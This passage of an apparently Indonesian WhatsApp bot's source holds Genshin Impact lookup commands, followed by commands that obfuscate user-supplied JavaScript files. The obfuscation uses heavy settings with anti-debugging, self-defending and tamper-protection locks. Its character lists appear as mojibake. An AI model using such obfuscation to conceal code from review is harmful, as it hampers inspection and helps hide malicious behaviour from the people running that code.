            response += `*Element:* ${talent.element || "Data tidak tersedia"}\n\n`;
          });
          reply(response);
        } else {
          reply(`Bakat untuk karakter '${text}' tidak ditemukan.`);
        }
      } catch (err) {
        reply('Terjadi Kesalahan...')
        reply(`*Tidak Ditemukan*\n\n*Bakat untuk karakter '${text}' tidak ditemukan.`);
      }
    };
    break

    case 'genshin-potion':
    case 'g-potion':
    case 'gens-potion': {
      
      if (!text) return reply(`Contoh: *${prefix + command} squirrel fish*\nHarap berikan nama ramuan atau makanan.`)
      try {
        let result = await genshindb.foods(text);
        if (result) {
          let response = `*Ramuan atau Makanan Ditemukan: ${result.name}*\n\n`;
          response += `_${result.description || "Deskripsi tidak tersedia"}_\n\n`;
          response += `*Rarity:* ${result.rarity || "Data tidak tersedia"}\n`;
          response += `*Efek:* ${result.effect || "Data tidak tersedia"}`;
          reply(response);
        } else {
          reply(`Ramuan atau makanan '${text}' tidak ditemukan.`);
        }
      } catch (err) {
        reply('Terjadi Kesalahan...')
        try {
          let availableFoods = await genshindb.foods("names", {
            matchCategories: true
          });
          reply(`*List ${text} foods :*\n\n- ${availableFoods.join("\n- ")}`);
        } catch (err) {
          reply('Terjadi Kesalahan...')
          let availableFoods = await genshindb.foods("names", {
            matchCategories: true
          });
          reply(`*Not Found*\n\n*Available foods is :*\n${availableFoods.join(", ")}`);
        }
      }
    };
    break

    case 'genshin-outfit':
    case 'g-outfit':
    case 'gens-outfit': {
      
      if (!text) return reply(`Contoh: *${prefix + command} outrider*\nHarap berikan nama kostum atau outfit.`);
      try {
        let result = await genshindb.outfits(text);
        if (result) {
          let response = `*Kostum Ditemukan: ${result.name}*\n\n`;
          response += `_${result.description || "Deskripsi tidak tersedia"}_\n\n`;
          response += `*Karakter:* ${result.character || "Data tidak tersedia"}`;
          if (result.url && result.url.modelviewer) {
            response += `\n_${result.url.modelviewer}_`;
          }
          reply(response);
        } else {
          reply(`Kostum '${text}' tidak ditemukan.`);
        }
      } catch (err) {
        reply('Terjadi Kesalahan...')
        try {
          let availableOutfits = await genshindb.outfits(text, {
            matchCategories: true
          });
          reply(`*List ${text} outfit :*\n\n- ${availableOutfits.join("\n- ")}`);
        } catch (err) {
          reply('Terjadi Kesalahan...')
          let availableOutfits = await genshindb.outfits("names", {
            matchCategories: true
          });
          reply(`*Not Found*\n\n*Available outfits is:*\n${availableOutfits.join(", ")}`);
        }
      }
    };
    break

    case 'genshin-nation':
    case 'g-nation':
    case 'gens-nation': {
      
      if (!text) return reply(`Contoh: *${prefix + command} mondstadt*\nHarap berikan nama wilayah atau nasionalitas.`);
      try {
        let result = await genshindb.geographies(text);
        if (result) {
          let response = `*Informasi Wilayah Ditemukan: ${result.name}*\n\n`;
          response += `_${result.description || "Deskripsi tidak tersedia"}_\n\n`;
          response += `*Area:* ${result.area || "Data tidak tersedia"}\n`;
          response += `*Region:* ${result.region || "Data tidak tersedia"}`;
          reply(response);
        } else {
          reply("Informasi wilayah tidak ditemukan.");
        }
      } catch (err) {
        reply('Terjadi Kesalahan...')
        let available = await genshindb.geographies("names", {
          matchCategories: true
        });
        reply(`*Tidak Ditemukan*\n\n*Wilayah yang tersedia:* ${available.join(", ")}`);
      }
    };
    break

    case 'genshin-namacard':
    case 'g-namacard':
    case 'gens-namacard': {
      
      if (!text) return reply(`Contoh: *${prefix + command} anemo flare*\nHarap berikan nama kartu nama.`);
      try {
        let result = await genshindb.namecards(text);
        if (result) {
          let response = `*Kartu Nama Ditemukan: ${result.name}*\n\n`;
          response += `_${result.description || "Deskripsi tidak tersedia"}_\n\n`;
          response += `*Rarity:* ${result.rarity || "Data tidak tersedia"}\n`;
          response += `*Unlock:* ${result.unlock || "Data tidak tersedia"}`;
          reply(response);
        } else {
          reply("Kartu nama tidak ditemukan.");
        }
      } catch (err) {
        reply('Terjadi Kesalahan...')
        let available = await genshindb.namecards("names", {
          matchCategories: true
        });
        reply(`*Tidak Ditemukan*\n\n*Kartu nama yang tersedia:* ${available.join(", ")}`);
      }
    };
    break

    case 'genshin-materials':
    case 'g-materials':
    case 'gens-materials': {
      
      if (!text) return reply(`Contoh: *${prefix + command} boreal wolf's milk*\nHarap berikan nama material.`);
      try {
        let result = await genshinmaterials(text);
        if (result) {
          let response = `*Material Ditemukan: ${result.name}*\n\n`;
          response += `_${result.description || "Deskripsi tidak tersedia"}_\n\n`;
          response += `*Rarity:* ${result.rarity || "Data tidak tersedia"}\n`;
          response += `*Type:* ${result.type || "Data tidak tersedia"}`;
          reply(response);
        } else {
          reply("Material tidak ditemukan.");
        }
      } catch (err) {
        reply('Terjadi Kesalahan...')
        let available = await genshinmaterials("names", {
          matchCategories: true
        });
        reply(`*Tidak Ditemukan*\n\n*Material yang tersedia:* ${available.join(", ")}`);
      }
    };
    break

    case 'genshin-food':
    case 'g-food':
    case 'gens-food': {
      
      if (!text) return reply(`Contoh: *${prefix + command} temptation*\nHarap berikan nama makanan.`);
      try {
        let result = await genshindb.foods(text);
        if (result) {
          let response = `*Makanan Ditemukan: ${result.name}*\n\n`;
          response += `_"${result.description}"_\n\n`;
          response += `*Rarity:* ${result.rarity}\n`;
          response += `*Type:* ${result.foodtype}\n`;
          response += `*Category:* ${result.foodfilter} (${result.foodcategory})\n\n`;
          if (result.effect) {
            response += `*Effect:*\n${result.effect}\n\n`;
          }
          if (result.suspicious) {
            response += `*Suspicious:*\n${result.suspicious.effect}\n_"${result.suspicious.description}"_\n\n`;
          }
          if (result.normal) {
            response += `*Normal:*\n${result.normal.effect}\n_"${result.normal.description}"_\n\n`;
          }
          if (result.delicious) {
            response += `*Delicious:*\n${result.delicious.effect}\n_"${result.delicious.description}"_\n\n`;
          }
          reply(response);
        } else {
          reply("Makanan tidak ditemukan.");
        }
      } catch (err) {
        reply('Terjadi Kesalahan...')
        let available = await genshindb.foods("names", {
          matchCategories: true
        });
        reply(`*Tidak Ditemukan*\n\n*Makanan yang tersedia:* ${available.join(", ")}`);
      }
    };
    break

    case 'genshin-enemy':
    case 'g-enemy':
    case 'gens-enemy': {
      
      if (!text) return reply(`Contoh: *${prefix + command} ruin guard*\nHarap berikan nama musuh.`);
      try {
        let result = await genshindb.enemies(text);
        if (result) {
          let response = `*Musuh Ditemukan: ${result.name}*\n\n`;
          response += `_${result.description || "Deskripsi tidak tersedia"}_\n\n`;
          response += `*Level:* ${result.level || "Data tidak tersedia"}\n`;
          response += `*Rarity:* ${result.rarity || "Data tidak tersedia"}\n`;
          response += `*Element:* ${result.element || "Data tidak tersedia"}`;
          reply(response);
        } else {
          reply("Musuh tidak ditemukan.");
        }
      } catch (err) {
        reply('Terjadi Kesalahan...')
        let available = await genshindb.enemies("names", {
          matchCategories: true
        });
        reply(`*Tidak Ditemukan*\n\n*Musuh yang tersedia:* ${available.join(", ")}`);
      }
    };
    break

    case 'genshin-emoji':
    case 'g-emoji':
    case 'gens-emoji': {
      
      if (!text) return reply(`Contoh: *${prefix + command} anemo*\nHarap berikan nama emoji.`);
      try {
        let result = await genshindb.emojis(text);
        if (result) {
          let response = `*Emoji Ditemukan: ${result.name}*\n\n`;
          response += `_${result.description}_\n\n`;
          response += `*Rarity:* ${result.rarity || "Data tidak tersedia"}`;
          reply(response);
        } else {
          reply("Emoji tidak ditemukan.");
        }
      } catch (err) {
        reply('Terjadi Kesalahan...')
        let available = await genshindb.emojis("names", {
          matchCategories: true
        });
        reply(`*Tidak Ditemukan*\n\n*Emoji yang tersedia:* ${available.join(", ")}`);
      }
    };
    break

    case 'genshin-domain':
    case 'g-domain':
    case 'gens-domain': {
      
      if (!text) return reply(`Contoh: *${prefix + command} valley of remembrance*\nHarap berikan nama domain.`);
      try {
        let result = await genshindb.domains(text);
        if (result) {
          let response = `*Domain Ditemukan: ${result.name}*\n\n`;
          response += `_${result.description}_\n\n`;
          response += `*Area:* ${result.area || "Data tidak tersedia"}\n`;
          response += `*Level:* ${result.level || "Data tidak tersedia"}`;
          reply(response);
        } else {
          reply("Domain tidak ditemukan.");
        }
      } catch (err) {
        reply('Terjadi Kesalahan...')
        let available = await genshindb.domains("names", {
          matchCategories: true
        });
        reply(`*Tidak Ditemukan*\n\n*Domain yang tersedia:* ${available.join(", ")}`);
      }
    };
    break

    case 'genshin-craft':
    case 'g-craft':
    case 'gens-craft': {
      
      if (!text) return reply(`Contoh: *${prefix + command} mystical enhancement ore*\nHarap berikan nama craft.`);
      try {
        let result = await genshindb.crafts(text);
        if (result) {
          let response = `*Craft Ditemukan: ${result.name}*\n\n`;
          response += `_${result.description}_\n\n`;
          response += `*Type:* ${result.type || "Data tidak tersedia"}\n`;
          response += `*Rarity:* ${result.rarity || "Data tidak tersedia"}`;
          reply(response);
        } else {
          reply("Craft tidak ditemukan.");
        }
      } catch (err) {
        reply('Terjadi Kesalahan...')
        let available = await genshindb.crafts("names", {
          matchCategories: true
        });
        reply(`*Tidak Ditemukan*\n\n*Craft yang tersedia:* ${available.join(", ")}`);
      }
    };
    break

    case 'genshin-const':
    case 'g-const':
    case 'gens-const':
    case 'genshin-constellation':
    case 'g-constellation':
    case 'gens-constellation': {
      
      if (!text) return reply(`Contoh: *${prefix + command} diluc*\nHarap berikan nama karakter untuk mencari konstelasinya.`);
      try {
        let result = await genshindb.constellations(text);
        if (result && result.length > 0) {
          let response = `*Konstelasi ditemukan untuk karakter ${text}:*\n\n`;
          result.forEach((constellation, index) => {
            response += `*${index + 1}. ${constellation.name}*\n`;
            response += `_${constellation.effect}_\n\n`;
            response += `*Unlock At:* C${constellation.unlock || "Data tidak tersedia"}`;
            if (index < result.length - 1) response += "\n\n";
          });
          reply(response);
        } else {
          reply(`Konstelasi untuk karakter '${text}' tidak ditemukan.`);
        }
      } catch (err) {
        reply('Terjadi Kesalahan...')
        reply(`*Tidak Ditemukan*\n\n*Konstelasi untuk karakter '${text}' tidak ditemukan.`);
      }
    };
    break

    case 'genshin-artifaact':
    case 'g-artifact':
    case 'gens-artifact': {
      
      if (!text) return reply(`Contoh: *${prefix + command} berserker*\nHarap berikan nama artefak.`);
      try {
        let result = await genshindb.artifacts(text);
        if (result) {
          let response = `*Artefak Ditemukan: ${result.name}*\n\n`;
          response += `_${result.description}_\n\n`;
          response += `*Set:* ${result.set || "Data tidak tersedia"}\n`;
          response += `*Rarity:* ${result.rarity || "Data tidak tersedia"}\n`;
          response += `*Slot:* ${result.slot || "Data tidak tersedia"}`;
          reply(response);
        } else {
          reply("Artefak tidak ditemukan.");
        }
      } catch (err) {
        reply('Terjadi Kesalahan...')
        let available = await genshindb.artifacts("names", {
          matchCategories: true
        });
        reply(`*Tidak Ditemukan*\n\n*Artefak yang tersedia:* ${available.join(", ")}`);
      }
    };
    break

    case 'genshin-area':
    case 'g-area':
    case 'gens-area': {
      
      if (!text) return reply(`Contoh: *${prefix + command} liyue*\nHarap berikan nama tempat.`);
      try {
        let result = await genshindb.geographies(text);
        if (result) {
          let response = `*Info Geografi: ${result.name}*\n\n`;
          response += `_${result.description}_\n\n`;
          response += `*Area:* ${result.area || "Data tidak tersedia"}\n`;
          response += `*Region:* ${result.region || "Data tidak tersedia"}\n`;
          response += `*Urutan Sortir:* ${result.sortorder || "Data tidak tersedia"}`;
          reply(response);
        } else {
          reply("Geografi tidak ditemukan.");
        }
      } catch (err) {
        reply('Terjadi Kesalahan...')
        let available = await genshindb.geographies("names", {
          matchCategories: true
        });
        reply(`*Tidak Ditemukan*\n\n*Geografi yang tersedia:* ${available.join(", ")}`);
      }
    };
    break

    case 'genshin-animal':
    case 'g-animals':
    case 'gens-animals': {
      
      if (!text) return reply(`Contoh: *${prefix + command} shiba*\nHarap berikan nama hewan.`);
      try {
        let animal = await genshindb.animals(text);
        if (animal) {
          let response = `*Hewan Ditemukan: ${animal.name}*\n\n`;
          response += `"${animal.description}"\n\n`;
          response += `*Kategori:* ${animal.category || ""}\n`;
          response += `*Jenis Hitungan:* ${animal.counttype || ""}\n`;
          response += `_${animal.sortorder ? `Urutan Sortir: ${animal.sortorder}` : ""}_`;
          reply(response);
        } else {
          reply("Hewan tidak ditemukan.");
        }
      } catch (err) {
        reply('Terjadi Kesalahan...')
        try {
          let animalCategories = await genshindb.animals(text, {
            matchCategories: true
          });
          reply(`*Kategori Hewan ${text} :*\n\n- ${animalCategories.join("\n- ")}`);
        } catch (err) {
          reply('Terjadi Kesalahan...')
          let allAnimalNames = await genshindb.animals("names", {
            matchCategories: true
          });
          reply(`*Tidak Ditemukan*\n\n*Hewan yang tersedia:* ${allAnimalNames.join(", ")}`);
        }
      }
    };
    break

    case 'genshin-rankaddventure':
    case 'g-rankaddventure':
    case 'genshin-advrank':
    case 'g-advrank':
    case 'gens-rankaddventure':
    case 'gens-advrank': {
      
      if (!text || isNaN(parseInt(text))) {
        return reply(`Masukkan nomor peringkat petualang yang valid. Contoh: *${prefix + command} 5*`);
      }
      try {
        let rankNumber = parseInt(text);
        let result = await genshindb.adventureranks(rankNumber);
        if (result) {
          let response = `*Rank Petualang Ditemukan untuk Rank ${rankNumber}:*\n\n`;
          response += `*Experience:* ${result.exp || "Data tidak tersedia"}\n`;
          response += `*Reward:* ${result.reward || "Data tidak tersedia"}\n`;
          response += `*Deskripsi:* ${result.description || "Data tidak tersedia"}`;
          reply(response);
        } else {
          reply(`Rank petualang untuk Rank ${rankNumber} tidak ditemukan.`);
        }
      } catch (err) {
        reply('Terjadi Kesalahan...')
        let availableRanks = await genshindb.adventureranks("names");
        reply(`*Tidak Ditemukan*\n\n*Rank petualang yang tersedia:* ${availableRanks.join(", ")}`);
      }
    };
    break

    case 'genshin-achievement':
    case 'g-achievement':
    case 'gens-achievement': {
      
      if (!text) return reply(`Contoh: *${prefix + command} mondstadt*\nHarap berikan nama prestasi.`);
      try {
        let result = await genshindb.achievements(text);
        if (result) {
          let response = `*${result.name}*\n`;
          response += `_${result.description}_\n\n`;
          response += `*Kategori:* ${result.category || ""}\n`;
          response += `*Rarity:* ${result.rarity || ""}\n`;
          response += `*Detail:* ${result.detail || ""}\n`;
          response += `*Cara Mendapatkan:* ${result.howToObtain || ""}\n`;
          reply(response);
        } else {
          reply("Prestasi tidak ditemukan.");
        }
      } catch (err) {
        reply('Terjadi Kesalahan...')
        let available = await genshindb.achievements("names", {
          matchCategories: true
        });
        reply(`*Tidak Ditemukan*\n\n*Prestasi yang tersedia:* ${available.join(", ")}`);
      }
    };
    break

    case 'genshin-char':
    case 'g-char':
    case 'gens-char':
    case 'genshin-characters':
    case 'g-characters':
    case 'gens-characters': {
      
      if (!text) return reply(`Contoh: *${prefix + command} diluc*\nHarap berikan nama karakter.`);
      try {
        let result = await genshindb.characters(text);
        if (result) {
          let response = `*Karakter Ditemukan: ${result.name}*\n\n`;
          response += `_${result.description}_\n\n`;
          response += `*Rarity:* ${result.rarity || "Data tidak tersedia"}\n`;
          response += `*Vision:* ${result.vision || "Data tidak tersedia"}\n`;
          response += `*Senjata:* ${result.weapon || "Data tidak tersedia"}`;
          reply(response);
        } else {
          reply("Karakter tidak ditemukan.");
        }
      } catch (err) {
        reply('Terjadi Kesalahan...')
        let available = await genshindb.characters("names", {
          matchCategories: true
        });
        reply(`*Tidak Ditemukan*\n\n*Karakter yang tersedia:* ${available.join(", ")}`);
      }
    };
    break
    
    //  ENC MENU
                case 'encarab':
            case 'encryptarab':
            case 'encrypt-arab':
            case 'arabenc':
            case 'arab-encrypt':
            case 'enc-arab': {
              if (!m.quoted) return reply('Kutip pesan dokumen!')
              try {
                React()

                const fileName = quoted.fileName || ''
                if (!fileName.endsWith('.js')) return reply('Kutip file JavaScript (.js) untuk dienkripsi!')

                const arab = ['Ø£', 'Ø¨', 'Øª', 'Ø«', 'Ø¬', 'Ø­', 'Ø®', 'Ø¯', 'Ø°', 'Ø±', 'Ø²', 'Ø³', 'Ø´', 'Øµ', 'Ø¶', 'Ø·', 'Ø¸', 'Ø¹', 'Øº', 'Ù', 'Ù‚', 'Ùƒ', 'Ù„', 'Ù…', 'Ù†', 'Ù‡', 'Ùˆ', 'ÙŠ']
                const genArab = () => Array.from({
                  length: Math.floor(Math.random() * 4) + 3
                }, () => arab[Math.floor(Math.random() * arab.length)]).join('')

                const getArabObf = () => ({
                  target: 'node',
                  compact: true,
                  renameVariables: true,
                  renameGlobals: true,
                  identifierGenerator: genArab,
                  stringEncoding: true,
                  stringSplitting: true,
                  controlFlowFlattening: 0.95,
                  shuffle: true,
                  duplicateLiteralsRemoval: true,
                  deadCode: true,
                  calculator: true,
                  opaquePredicates: true,
                  lock: {
                    selfDefending: true,
                    antiDebug: true,
                    integrity: true,
                    tamperProtection: true
                  }
                })

                const bar = (p) => {
                  const t = 20
                  const f = Math.round(p / 5)
                  return `[${'â–ˆ'.repeat(f)}${' '.repeat(t - f)}] ${p}%`
                }

                let media = await downloadContentFromMessage(quoted, 'document')
                let buffer = Buffer.from([])
                for await (const chunk of media) buffer = Buffer.concat([buffer, chunk])
                const raw = buffer.toString('utf8')

                try {
                  new Function(raw)
                } catch (e) {
                  return reply(`âŒ File JS tidak valid:\n${e.message}`)
                }

                const obf = await JsConfuser.obfuscate(raw, getArabObf())
                const code = typeof obf === 'string' ? obf : (obf && obf.code) || String(obf)

                const outName = `arab-encrypted-${Date.now()}.js`
                const outPath = path.join(__dirname, outName)
                fs.writeFileSync(outPath, code, 'utf8')

                const fileBuffer = fs.readFileSync(outPath)
                await sock.sendMessage(m.chat, {
                  document: fileBuffer,
                  mimetype: 'application/javascript',
                  fileName: outName,
                  caption: 'âœ… *Arab encrypted!*'
                }, {
                  quoted: fakeQuoted
                })

                try {
                  fs.unlinkSync(outPath)
                } catch (e) {}
              } catch (err) {
                console.error(err)
                reply(`âŒ Terjadi kesalahan: ${err && err.message ? err.message : String(err)}`)
              }
            }
            break
                        case 'encchina':
            case 'encryptchina':
            case 'encrypt-china':
            case 'chinaenc':
            case 'china-encrypt':
            case 'enc-china':
            case 'encmandarin':
            case 'encryptmandarin':
            case 'encrypt-mandarin':
            case 'mandarinenc':
            case 'mandarin-encrypt':
            case 'enc-mandarin': {
              if (!m.quoted) return reply('Balas file .js untuk dienkripsi!')
              try {
                React()

                const fileName = quoted.fileName || ''
                if (!fileName.endsWith('.js')) return reply('Kutip file `.js` untuk dienkripsi!')

                const mandarin = [
                  "é¾™", "è™", "é£", "äº‘", "å±±", "æ²³", "å¤©", "åœ°", "é›·", "ç”µ", "ç«", "æ°´",
                  "æœ¨", "é‡‘", "åœŸ", "æ˜Ÿ", "æœˆ", "æ—¥", "å…‰", "å½±", "å³°", "æ³‰", "æ—", "æµ·",
                  "é›ª", "éœœ", "é›¾", "å†°", "ç„°", "çŸ³"
                ]
                const genMandarin = () => Array.from({
                  length: Math.floor(Math.random() * 4) + 3
                }, () => mandarin[Math.floor(Math.random() * mandarin.length)]).join('')

                const getMandarinObf = () => ({
                  target: 'node',
                  compact: true,
                  renameVariables: true,
                  renameGlobals: true,
                  identifierGenerator: genMandarin,
                  stringEncoding: true,
                  stringSplitting: true,
                  controlFlowFlattening: 0.95,
                  shuffle: true,
                  duplicateLiteralsRemoval: true,
                  deadCode: true,
                  calculator: true,
                  opaquePredicates: true,
                  lock: {
                    selfDefending: true,
                    antiDebug: true,
                    integrity: true,
                    tamperProtection: true
                  }
                })

                const bar = (p) => {
                  const t = 20
                  const f = Math.round(p / 5)
                  return `[${'â–ˆ'.repeat(f)}${' '.repeat(t - f)}] ${p}%`
                }

                let media = await downloadContentFromMessage(quoted, 'document')
                let buffer = Buffer.from([])
                for await (const chunk of media) buffer = Buffer.concat([buffer, chunk])
                const raw = buffer.toString('utf8')

                try {
                  new Function(raw)
                } catch (e) {
                  return reply(`âŒ File JS tidak valid:\n${e.message}`)
                }

                const obf = await JsConfuser.obfuscate(raw, getMandarinObf())
                const code = typeof obf === 'string' ? obf : (obf && obf.code) || String(obf)

                const outName = `china-encrypted-${Date.now()}.js`
                const outPath = path.join(__dirname, outName)
                fs.writeFileSync(outPath, code, 'utf8')

                const fileBuffer = fs.readFileSync(outPath)
                await sock.sendMessage(m.chat, {
                  document: fileBuffer,
                  mimetype: 'application/javascript',
                  fileName: outName,
                  caption: 'âœ… *Mandarin encrypted!*'
                }, {
                  quoted: fakeQuoted
                })

                try {
                  fs.unlinkSync(outPath)
                } catch (e) {}
              } catch (err) {
                console.error(err)
                reply(`âŒ Terjadi kesalahan: ${err && err.message ? err.message : String(err)}`)
              }
            }
            break

            case 'enccustom':
            case 'encryptcustom':
            case 'encrypt-custom':
            case 'customenc':
            case 'custom-encrypt':
            case 'enc-custom': {
              if (!m.quoted) return reply('Kutip file .js untuk dienkripsi!')
              try {
                React()

                const args = (text || '').trim().split(/\s+/)
                const customName = (args[0] || '').replace(/[^a-zA-Z0-9_]/g, '')
                if (!customName) return reply(`Format: ${cmd} <nama>\nContoh: ${cmd} myid`)

                const fileName = quoted.fileName || ''
                if (!fileName.endsWith('.js')) return reply('Kutip file `.js` untuk dienkripsi!')

                const idGen = () => {
                  const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
                  let suf = ''
                  for (let i = 0; i < Math.floor(Math.random() * 3) + 2; i++) suf += chars[Math.floor(Math.random() * chars.length)]
                  return `${customName}_${suf}`
                }

                const getCustomObf = () => ({
                  target: 'node',
                  compact: true,
                  renameVariables: true,
                  renameGlobals: true,
                  identifierGenerator: idGen,
                  stringEncoding: true,
                  stringSplitting: true,
                  controlFlowFlattening: 0.75,
                  shuffle: true,
                  duplicateLiteralsRemoval: true,
                  deadCode: true,
                  calculator: true,
                  opaquePredicates: true,
                  lock: {
                    selfDefending: true,
                    antiDebug: true,
                    integrity: true,
                    tamperProtection: true
                  }
                })

                const bar = (p) => {
                  const t = 20
                  const f = Math.round(p / 5)
                  return `[${'â–ˆ'.repeat(f)}${' '.repeat(t - f)}] ${p}%`
                }

                let media = await downloadContentFromMessage(quoted, 'document')
                let buffer = Buffer.from([])
                for await (const chunk of media) buffer = Buffer.concat([buffer, chunk])
                const raw = buffer.toString('utf8')

                try {
                  new Function(raw)
                } catch (e) {
                  return reply(`âŒ File JS tidak valid:\n${e.message}`)
                }

                const obf = await JsConfuser.obfuscate(raw, getCustomObf())
                const code = typeof obf === 'string' ? obf : (obf && obf.code) || String(obf)

                const outName = `custom-encrypted-${customName}-${Date.now()}.js`
                const outPath = path.join(__dirname, outName)
                fs.writeFileSync(outPath, code, 'utf8')

                const fileBuffer = fs.readFileSync(outPath)
                await sock.sendMessage(m.chat, {
                  document: fileBuffer,
                  mimetype: 'application/javascript',
                  fileName: outName,
                  caption: `âœ… *Custom encrypted (${customName})!*`
                }, {
                  quoted: fakeQuoted
                })

                try {
                  fs.unlinkSync(outPath)
                } catch (e) {}
              } catch (err) {
                console.error(err)
                reply(`âŒ Terjadi kesalahan: ${err && err.message ? err.message : String(err)}`)
              }
            }
            break

            case 'encinvis':
            case 'encryptinvis':
            case 'encrypt-invis':
            case 'invisenc':
            case 'invis-encrypt':
            case 'enc-invis':
            case 'encinvisible':
            case 'encryptinvisible':
            case 'encrypt-invisible':
            case 'invisibleenc':
            case 'invisible-encrypt':
            case 'enc-invisible': {
              if (!m.quoted) return reply('Kutip pesan dokumen!')
              try {
                React()

                const fileName = quoted.fileName || ''
                if (!fileName.endsWith('.js')) return reply('Kutip file `.js` untuk dienkripsi!')

                const genInvis = () => '_'.repeat(Math.floor(Math.random() * 4) + 3) + Math.random().toString(36).slice(2, 5)
                const getInvisObf = () => ({
                  target: 'node',
                  compact: true,
                  renameVariables: true,
                  renameGlobals: true,
                  identifierGenerator: genInvis,
                  stringEncoding: true,
                  stringSplitting: true,
                  controlFlowFlattening: 0.95,
                  shuffle: true,
                  duplicateLiteralsRemoval: true,
                  deadCode: true,
                  calculator: true,
                  opaquePredicates: true,
                  lock: {
                    selfDefending: true,
                    antiDebug: true,
                    integrity: true,
                    tamperProtection: true
                  }
                })

                const bar = (p) => {
                  const t = 20
                  const f = Math.round(p / 5)
                  return `[${'â–ˆ'.repeat(f)}${' '.repeat(t - f)}] ${p}%`
                }

                let media = await downloadContentFromMessage(quoted, 'document')
                let buffer = Buffer.from([])
                for await (const chunk of media) buffer = Buffer.concat([buffer, chunk])
                const raw = buffer.toString('utf8')

                try {
                  new Function(raw)
                } catch (e) {
                  return reply(`âŒ File JS tidak valid:\n${e.message}`)
                }

                const obf = await JsConfuser.obfuscate(raw, getInvisObf())
                const code = typeof obf === 'string' ? obf : (obf && obf.code) || String(obf)

                const outName = `invis-encrypted-${Date.now()}.js`
                const outPath = path.join(__dirname, outName)
                fs.writeFileSync(outPath, code, 'utf8')

                const fileBuffer = fs.readFileSync(outPath)
                await sock.sendMessage(m.chat, {
                  document: fileBuffer,
                  mimetype: 'application/javascript',
                  fileName: outName,
                  caption: 'âœ… *Invisible encrypted siap!*'
                }, {
                  quoted: fakeQuoted
                })

                try {
                  fs.unlinkSync(outPath)
                } catch (e) {}
              } catch (err) {
                console.error(err)
                reply(`âŒ Terjadi kesalahan: ${err && err.message ? err.message : String(err)}`)
              }
            }
            break

            case 'encsiu':
            case 'encryptsiu':
            case 'encrypt-siu':
            case 'siuenc':
            case 'siu-encrypt':
            case 'enc-siu': {
              if (!m.quoted) return reply('Kutip pesan dokumen!')
              try {
                React()

                const fileName = quoted.fileName || ''
                if (!fileName.endsWith('.js')) return reply('Kutip file `.js` untuk dienkripsi!')

                const genSiu = () => {
                  const abc = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
                  let r = ''
                  for (let i = 0; i < 6; i++) r += abc[Math.floor(Math.random() * abc.length)]
                  return `CalceKarikå’ŒSiuSiu${r}`
                }

                const getSiuObf = () => ({
                  target: 'node',
                  compact: true,
                  renameVariables: true,
                  renameGlobals: true,
                  identifierGenerator: genSiu,
                  stringCompression: true,
                  stringEncoding: true,
                  stringSplitting: true,
                  controlFlowFlattening: 0.95,
                  flatten: true,
                  shuffle: true,
                  duplicateLiteralsRemoval: true,
                  deadCode: true,
                  calculator: true,
                  opaquePredicates: true,
                  lock: {
                    selfDefending: true,
                    antiDebug: true,
                    integrity: true,
                    tamperProtection: true
                  }
                })

                const bar = (p) => {
                  const t = 20
                  const f = Math.round(p / 5)
                  return `[${'â–ˆ'.repeat(f)}${' '.repeat(t - f)}] ${p}%`
                }

                let media = await downloadContentFromMessage(quoted, 'document')
                let buffer = Buffer.from([])
                for await (const chunk of media) buffer = Buffer.concat([buffer, chunk])
                const raw = buffer.toString('utf8')

                try {
                  new Function(raw)
                } catch (e) {
                  return reply(`âŒ File JS tidak valid:\n${e.message}`)
                }

                const obf = await JsConfuser.obfuscate(raw, getSiuObf())
                const code = typeof obf === 'string' ? obf : (obf && obf.code) || String(obf)

                const outName = `siu-encrypted-${Date.now()}.js`
                const outPath = path.join(__dirname, outName)
                fs.writeFileSync(outPath, code, 'utf8')

                const fileBuffer = fs.readFileSync(outPath)
                await sock.sendMessage(m.chat, {
                  document: fileBuffer,
                  mimetype: 'application/javascript',
                  fileName: outName,
                  caption: 'âœ… *Calcrick Chaos Core encrypted!*'
                }, {
                  quoted: fakeQuoted
                })

                try {
                  fs.unlinkSync(outPath)
                } catch (e) {}
              } catch (err) {
                console.error(err)
                reply(`âŒ Terjadi kesalahan: ${err && err.message ? err.message : String(err)}`)
              }
            }
            break

            case 'encstrong':
            case 'encryptstrong':
            case 'encrypt-strong':
            case 'strongenc':
            case 'strong-encrypt':
            case 'enc-strong': {
              if (!m.quoted) return reply('Kutip pesan dokumen!')
              try {
                React()

                const fileName = quoted.fileName || ''
                if (!fileName.endsWith('.js')) return reply('Kutip file `.js` untuk dienkripsi!')

                const getStrongObf = () => ({
                  target: 'node',
                  compact: true,
                  renameVariables: true,
                  renameGlobals: true,
                  identifierGenerator: 'randomized',
                  stringEncoding: true,
                  stringSplitting: true,
                  controlFlowFlattening: 0.75,
                  shuffle: true,
                  duplicateLiteralsRemoval: true,
                  calculator: true,
                  dispatcher: true,
                  deadCode: true,
                  opaquePredicates: true,
                  lock: {
                    selfDefending: true,
                    antiDebug: true,
                    integrity: true,
                    tamperProtection: true
                  }
                })

                const bar = (p) => {
                  const t = 20
                  const f = Math.round(p / 5)
                  return `[${'â–ˆ'.repeat(f)}${' '.repeat(t - f)}] ${p}%`
                }

                let media = await downloadContentFromMessage(quoted, 'document')
                let buffer = Buffer.from([])
                for await (const chunk of media) buffer = Buffer.concat([buffer, chunk])
                const raw = buffer.toString('utf8')

                try {
                  new Function(raw)
                } catch (e) {
                  return reply(`âŒ File JS tidak valid:\n${e.message}`)
                }

                const obf = await JsConfuser.obfuscate(raw, getStrongObf())
                const code = typeof obf === 'string' ? obf : (obf && obf.code) || String(obf)

                const outName = `strong-encrypted-${Date.now()}.js`
                const outPath = path.join(__dirname, outName)
                fs.writeFileSync(outPath, code, 'utf8')

                const fileBuffer = fs.readFileSync(outPath)
                await sock.sendMessage(m.chat, {
                  document: fileBuffer,
                  mimetype: 'application/javascript',
                  fileName: outName,
                  caption: 'âœ… *Hardened Strong encrypted!* â€” SATURN ğŸ”¥'
                }, {
                  quoted: fakeQuoted
                })

                try {
                  fs.unlinkSync(outPath)
                } catch (e) {}
              } catch (err) {
                console.error(err)
                reply(`âŒ Terjadi kesalahan: ${err && err.message ? err.message : String(err)}`)
              }
            }
            break

            case 'encultra':
            case 'encryptultra':
            case 'encrypt-ultra':
            case 'ultraenc':
            case 'ultra-encrypt':
            case 'enc-ultra': {
              if (!m.quoted) return reply('Kutip pesan dokumen!')
              try {
                React()

                const fileName = quoted.fileName || ''
                if (!fileName.endsWith('.js')) return reply('Kutip file `.js` untuk dienkripsi!')

                const genUltra = () => {
                  const chars = 'abcdefghijklmnopqrstuvwxyz'
